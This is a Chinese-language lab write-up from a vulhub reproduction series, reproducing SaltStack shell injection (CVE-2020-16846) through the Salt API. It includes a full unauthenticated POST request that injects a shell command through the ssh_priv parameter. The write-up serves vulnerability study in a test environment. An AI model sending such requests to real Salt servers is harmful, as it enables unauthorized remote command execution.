# SaltStack Shell注入（CVE-2020-16846）

###### by ADummy

### 0x00利用路线

​			BurpsuitePOST一个包--->命令执行

### 0x01漏洞介绍

​			Salt是一种基于动态通信总线的基础架构管理的新方法。Salt可以用于数据驱动的编排，任何基础架构的远程执行，任何应用程序堆栈的配置管理等等。

2020年11月，SaltStack正式披露了两个漏洞CVE-2020-16846和CVE-2020-25592。CVE-2020-25592允许任意用户使用SSH模块，CVE-2020-16846允许用户执行任意命令。链接这两个漏洞将允许未经授权的攻击者通过Salt API执行任意命令。

##### 			影响版本

```
SaltStack Version 2015/2016/2017/2018/2019/3000/3001/3002
```

### 0x02漏洞复现

环境启动后，将会在本地监听如下端口：

```
4505/4506 这是SaltStack Master与minions通信的端口
8000 这是Salt的API端口
2222 这是容器内部的SSH服务器监听的端口
```

将以下请求发送到`https://your-ip:8000/run`：

```
POST /run HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/x-yaml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|touch%20/tmp/success%3b
```

`touch /tmp/success`通过`ssh_priv`参数注入命令：

![SaltStack_Shell注入漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/SaltStack_Shell注入漏洞_1.jpg)

![SaltStack_Shell注入漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/SaltStack_Shell注入漏洞_2.jpg)

![SaltStack_Shell注入漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/SaltStack_Shell注入漏洞_3.jpg)



